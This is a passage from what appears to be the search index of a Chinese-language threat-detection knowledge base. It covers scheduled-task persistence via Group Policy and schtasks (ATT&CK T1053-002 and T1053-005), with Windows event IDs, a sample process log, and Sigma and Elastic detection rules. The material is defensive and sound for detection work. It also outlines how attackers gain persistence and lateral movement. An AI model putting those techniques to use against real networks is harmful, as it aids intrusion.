\u5982\u679c\u6e90IP\u4e0d\u662flocalhost\uff0c\u5219\u5b83\u975e\u5e38\u53ef\u7591\uff0c\u6700\u597d\u540c\u65f6\u76d1\u89c6\u5bf9GPO\u8ba1\u5212\u4efb\u52a1\u7684\u672c\u5730\u548c\u8fdc\u7a0b\u66f4\u6539 level: high \u5176\u4ed6\u68c0\u6d4b\u601d\u8def \u901a\u8fc7\u547d\u4ee4\u884c\u8c03\u7528\u6765\u76d1\u63a7\u5e38\u7528\u5b9e\u7528\u7a0b\u5e8f\u7684\u8ba1\u5212\u4efb\u52a1\u521b\u5efa\u3002\u53ef\u4ee5\u5728\u5b89\u88c5\u65b0\u8f6f\u4ef6\u671f\u95f4\u6216\u901a\u8fc7\u7cfb\u7edf\u7ba1\u7406\u529f\u80fd\u521b\u5efa\u5408\u6cd5\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u76d1\u63a7Windows 10\u4e2dsvchost.exe \u548c\u65e7\u7248Windows \u4e2dWindows\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f taskeng.exe\u7684\u8fdb\u7a0b\u6267\u884c\u60c5\u51b5\u3002\u5982\u679c\u8ba1\u5212\u4efb\u52a1\u4e0d\u7528\u4e8e\u6301\u4e45\u6027\uff0c\u5219\u653b\u51fb\u8005\u5f88\u53ef\u80fd\u5728\u64cd\u4f5c\u5b8c\u6210\u65f6\u5220\u9664\u8be5\u4efb\u52a1\u3002\u76d1\u63a7%systemroot%\\System32\\Tasks\u4e2d\u7684Windows\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u4ed3\u5e93\u6765\u67e5\u770b\u662f\u5426\u6709\u4e0e\u5df2\u77e5\u8f6f\u4ef6\u3001\u8865\u4e01\u5468\u671f\u7b49\u4e0d\u76f8\u5173\u7684\u8ba1\u5212\u4efb\u52a1\u7684\u66f4\u6539\u6761\u76ee\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\u7684\u4e00\u7cfb\u5217\u884c\u4e3a\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u4f8b\u5982\u4e3a\u547d\u4ee4\u4e0e\u63a7\u5236\u800c\u5efa\u7acb\u7f51\u7edc\u8fde\u63a5\uff0c\u901a\u8fc7\u53d1\u73b0\u4e86\u89e3\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u4ee5\u53ca\u6a2a\u5411\u79fb\u52a8\u3002 \u901a\u8fc7\u5728\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u4e2d\u542f\u7528\u201cMicrosoft-Windows-TaskScheduler / Operational\u201d\u8bbe\u7f6e\u7684\u65b9\u5f0f\u6765\u4e3a\u8ba1\u5212\u4efb\u52a1\u7684\u521b\u5efa\u548c\u66f4\u6539\u914d\u7f6e\u4e8b\u4ef6\u65e5\u5fd7\u529f\u80fd\u3002\u7136\u540e\u4f1a\u5728\u8ba1\u5212\u4efb\u52a1\u6d3b\u52a8\u4e2d\u8bb0\u5f55\u5982\u4e0b\u4e8b\u4ef6\uff1a \u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6106 \u2013 \u5df2\u6ce8\u518c\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6140/Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64702 \u2013 \u5df2\u66f4\u65b0\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6141/Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64699 \u2013 \u5df2\u5220\u9664\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64698 \u2013 \u5df2\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64700 \u2013 \u5df2\u542f\u7528\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64701 \u2013 \u5df2\u7981\u7528\u8ba1\u5212\u4efb\u52a1 \u4e5f\u53ef\u4f7f\u7528Sysinternals Autoruns\u7b49\u5de5\u5177\u6765\u68c0\u6d4b\u662f\u5426\u6709\u65e8\u5728\u83b7\u5f97\u6301\u4e45\u6027\u7684\u7cfb\u7edf\u66f4\u6539\uff0c\u5305\u62ec\u5217\u51fa\u5f53\u524d\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u67e5\u627e\u4e0e\u5df2\u77e5\u8f6f\u4ef6\u3001\u8865\u4e01\u5468\u671f\u7b49\u4e0d\u76f8\u5173\u7684\u4efb\u52a1\u66f4\u6539\u3002\u5f53\u4e0e\u5386\u53f2\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u901a\u8fc7\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u7684\u53ef\u7591\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u663e\u793a\u4e3a\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u5f02\u5e38\u8fdb\u7a0b\u3002 \u76d1\u63a7\u53ef\u7528\u4e8e\u521b\u5efa\u4efb\u52a1\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u3002\u5e26\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\uff0c\u5728\u5178\u578b\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u5916\u6267\u884c\u8fd9\u4e9b\u529f\u80fd\u3002Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u4e5f\u53ef\u7528\u6765\u521b\u5efa\u4efb\u52a1\uff0c\u56e0\u6b64\u53ef\u80fd\u8fd8\u9700\u8981\u914d\u7f6e\u65e5\u5fd7\u529f\u80fd\u6765\u6536\u96c6\u9002\u5f53\u7684\u6570\u636e\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1053-002 https://attack.mitre.org/techniques/T1053/002/ \u5229\u7528GPO\u4e2d\u7684\u8ba1\u5212\u4efb\u52a1\u5b9e\u73b0\u8fdc\u7a0b\u6267\u884c http://app.myzaker.com/news/article.php?pk=5c19b0d477ac64586a2bf889 GPO\u7ec4\u7b56\u7565\u5b89\u5168 https://www.cnblogs.com/zpchcbd/p/12932181.html","title":"T1053-002-win-\u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#t1053-002-win-gpo","text":"","title":"T1053-002-win-\u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#attck","text":"\u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_1","text":"\u901a\u8fc7Group Policy Management Console (GPMC) \u5b9e\u73b0\u8ba1\u5212\u4efb\u52a1\u7684\u8fdc\u7a0b\u6267\u884c\uff1b \u5177\u4f53\u53ef\u53c2\u80033gstudent\u5927\u4f6c\u7684 \u6587\u7ae0 GPO\u7ec4\u7b56\u7565\u5b89\u5168","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_5","text":"title: \u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c description: \u4f7f\u7528GPO\u8ba1\u5212\u4efb\u52a1\u68c0\u6d4b\u6a2a\u5411\u79fb\u52a8\uff0c\u901a\u5e38\u7528\u4e8e\u5927\u89c4\u6a21\u90e8\u7f72\u52d2\u7d22\u8f6f\u4ef6 author: 12306Br0(\u7ffb\u8bd1+\u6d4b\u8bd5) date: 2020/06/07 references: - https://twitter.com/menasec1/status/1106899890377052160 - https://www.secureworks.com/blog/ransomware-as-a-distraction tags: - attack.persistence - attack.lateral_movement - attack.t1053-002 logsource: product: windows service: security description: '\u5fc5\u987b\u4e3a\u6210\u529f/\u5931\u8d25\u914d\u7f6e\u9ad8\u7ea7\u5ba1\u6838\u7b56\u7565\u8bbe\u7f6e\u201c\u5bf9\u8c61\u8bbf\u95ee>\u5ba1\u6838\u8be6\u7ec6\u6587\u4ef6\u5171\u4eab' detection: selection: EventID: 5145 ShareName: \\\\*\\SYSVOL RelativeTargetName: '*ScheduledTasks.xml' Accesses: '*WriteData*' condition: selection falsepositives: - \u5982\u679c\u6e90IP\u4e0d\u662flocalhost\uff0c\u5219\u5b83\u975e\u5e38\u53ef\u7591\uff0c\u6700\u597d\u540c\u65f6\u76d1\u89c6\u5bf9GPO\u8ba1\u5212\u4efb\u52a1\u7684\u672c\u5730\u548c\u8fdc\u7a0b\u66f4\u6539 level: high","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_6","text":"\u901a\u8fc7\u547d\u4ee4\u884c\u8c03\u7528\u6765\u76d1\u63a7\u5e38\u7528\u5b9e\u7528\u7a0b\u5e8f\u7684\u8ba1\u5212\u4efb\u52a1\u521b\u5efa\u3002\u53ef\u4ee5\u5728\u5b89\u88c5\u65b0\u8f6f\u4ef6\u671f\u95f4\u6216\u901a\u8fc7\u7cfb\u7edf\u7ba1\u7406\u529f\u80fd\u521b\u5efa\u5408\u6cd5\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u76d1\u63a7Windows 10\u4e2dsvchost.exe \u548c\u65e7\u7248Windows \u4e2dWindows\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f taskeng.exe\u7684\u8fdb\u7a0b\u6267\u884c\u60c5\u51b5\u3002\u5982\u679c\u8ba1\u5212\u4efb\u52a1\u4e0d\u7528\u4e8e\u6301\u4e45\u6027\uff0c\u5219\u653b\u51fb\u8005\u5f88\u53ef\u80fd\u5728\u64cd\u4f5c\u5b8c\u6210\u65f6\u5220\u9664\u8be5\u4efb\u52a1\u3002\u76d1\u63a7%systemroot%\\System32\\Tasks\u4e2d\u7684Windows\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u4ed3\u5e93\u6765\u67e5\u770b\u662f\u5426\u6709\u4e0e\u5df2\u77e5\u8f6f\u4ef6\u3001\u8865\u4e01\u5468\u671f\u7b49\u4e0d\u76f8\u5173\u7684\u8ba1\u5212\u4efb\u52a1\u7684\u66f4\u6539\u6761\u76ee\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\u7684\u4e00\u7cfb\u5217\u884c\u4e3a\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u4f8b\u5982\u4e3a\u547d\u4ee4\u4e0e\u63a7\u5236\u800c\u5efa\u7acb\u7f51\u7edc\u8fde\u63a5\uff0c\u901a\u8fc7\u53d1\u73b0\u4e86\u89e3\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u4ee5\u53ca\u6a2a\u5411\u79fb\u52a8\u3002 \u901a\u8fc7\u5728\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u4e2d\u542f\u7528\u201cMicrosoft-Windows-TaskScheduler / Operational\u201d\u8bbe\u7f6e\u7684\u65b9\u5f0f\u6765\u4e3a\u8ba1\u5212\u4efb\u52a1\u7684\u521b\u5efa\u548c\u66f4\u6539\u914d\u7f6e\u4e8b\u4ef6\u65e5\u5fd7\u529f\u80fd\u3002\u7136\u540e\u4f1a\u5728\u8ba1\u5212\u4efb\u52a1\u6d3b\u52a8\u4e2d\u8bb0\u5f55\u5982\u4e0b\u4e8b\u4ef6\uff1a \u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6106 \u2013 \u5df2\u6ce8\u518c\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6140/Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64702 \u2013 \u5df2\u66f4\u65b0\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 7\uff0cServer 2008 R2\u4e0a\u7684\u4e8b\u4ef6141/Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64699 \u2013 \u5df2\u5220\u9664\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64698 \u2013 \u5df2\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64700 \u2013 \u5df2\u542f\u7528\u8ba1\u5212\u4efb\u52a1 \u00b7 Windows 10\uff0cServer 2016\u4e0a\u7684\u4e8b\u4ef64701 \u2013 \u5df2\u7981\u7528\u8ba1\u5212\u4efb\u52a1 \u4e5f\u53ef\u4f7f\u7528Sysinternals Autoruns\u7b49\u5de5\u5177\u6765\u68c0\u6d4b\u662f\u5426\u6709\u65e8\u5728\u83b7\u5f97\u6301\u4e45\u6027\u7684\u7cfb\u7edf\u66f4\u6539\uff0c\u5305\u62ec\u5217\u51fa\u5f53\u524d\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u67e5\u627e\u4e0e\u5df2\u77e5\u8f6f\u4ef6\u3001\u8865\u4e01\u5468\u671f\u7b49\u4e0d\u76f8\u5173\u7684\u4efb\u52a1\u66f4\u6539\u3002\u5f53\u4e0e\u5386\u53f2\u6570\u636e\u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u901a\u8fc7\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u7684\u53ef\u7591\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u663e\u793a\u4e3a\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u5f02\u5e38\u8fdb\u7a0b\u3002 \u76d1\u63a7\u53ef\u7528\u4e8e\u521b\u5efa\u4efb\u52a1\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u3002\u5e26\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\uff0c\u5728\u5178\u578b\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u5916\u6267\u884c\u8fd9\u4e9b\u529f\u80fd\u3002Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u4e5f\u53ef\u7528\u6765\u521b\u5efa\u4efb\u52a1\uff0c\u56e0\u6b64\u53ef\u80fd\u8fd8\u9700\u8981\u914d\u7f6e\u65e5\u5fd7\u529f\u80fd\u6765\u6536\u96c6\u9002\u5f53\u7684\u6570\u636e\u3002","title":"\u5176\u4ed6\u68c0\u6d4b\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#_7","text":"MITRE-ATT&CK-T1053-002 https://attack.mitre.org/techniques/T1053/002/ \u5229\u7528GPO\u4e2d\u7684\u8ba1\u5212\u4efb\u52a1\u5b9e\u73b0\u8fdc\u7a0b\u6267\u884c http://app.myzaker.com/news/article.php?pk=5c19b0d477ac64586a2bf889 GPO\u7ec4\u7b56\u7565\u5b89\u5168 https://www.cnblogs.com/zpchcbd/p/12932181.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/","text":"T1053-005-win-schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5b89\u6392\u547d\u4ee4\u548c\u7a0b\u5e8f\u5b9a\u671f\u8fd0\u884c\u6216\u5728\u6307\u5b9a\u65f6\u95f4\u5185\u8fd0\u884c\u3002\u4ece\u8ba1\u5212\u8868\u4e2d\u6dfb\u52a0\u548c\u5220\u9664\u4efb\u52a1\uff0c\u6309\u9700\u8981\u542f\u52a8\u548c\u505c\u6b62\u4efb\u52a1\uff0c\u663e\u793a\u548c\u66f4\u6539\u8ba1\u5212\u4efb\u52a1\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\uff0c\u53c2\u8003\uff1a Schtasks\u547d\u4ee4\u8be6\u89e3 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u53ef\u53c2\u770bwindows 4688\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u6837\u4f8b\uff0c\u8f85\u52a9\u7406\u89e3\u3002 Pre-Windows 2016/10 A new process has been created. Subject: Security ID: WIN-R9H529RIO4Y\\Administrator Account Name: Administrator Account Domain: WIN-R9H529RIO4Y Logon ID: 0x1fd23 Process Information: New Process ID: 0xed0 New Process Name: C:\\Windows\\System32\\notepad.exe Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x8c0 Creator Process Name: c:\\windows\\system32\\explorer.exe Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma title: schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1 description: \u68c0\u6d4b\u53ef\u7591\u7684schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1 author: 12306Br0 references: - https://www.elastic.co/guide/en/siem/guide/current/local-scheduled-task-commands.html tags: - attack.persistence - attack.t1053-005 logsource: product: windows service: sysmon / \u5b89\u5168\u65e5\u5fd7 #\u81ea\u884c\u914d\u7f6e detection: selection: EventID: - 4688 #windows\u5b89\u5168\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa - 1 #windows sysmon\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa Process Name: 'schtasks.exe' CommandLine: - '/create' - '-create' - '/S' - '-s' - '/run' - '-run' - '/change' - '-change' condition: selection level: low Elastic rule query event.action:\"Process Create (rule: ProcessCreate)\" and process.name:schtasks.exe and process.args:(-change or -create or -run or -s or /S or /change or /create or /run) \u5efa\u8bae \u9664\u4e86\u57fa\u4e8esysmon\u65e5\u5fd7\u4e4b\u5916\uff0c\u9ad8\u7248\u672c\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u4e2d4688\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1053-005 https://attack.mitre.org/techniques/T1053/005/","title":"T1053-005-win-schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#t1053-005-win-schtasks","text":"","title":"T1053-005-win-schtasks\u672c\u5730\u8ba1\u5212\u4efb\u52a1"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#attck","text":"\u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-005-win-schtasks%E6%9C%AC%E5%9C%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_1","text":"\u5b89\u6392\u547d\u4ee4\u548c\u7a0b\u5e8f\u5b9a\u671f\u8fd0\u884c\u6216\u5728\u6307\u5b9a\u65f6\u95f4\u5185\u8fd0\u884c\u3002\u4ece\u8ba1\u5212\u8868\u4e2d\u6dfb\u52a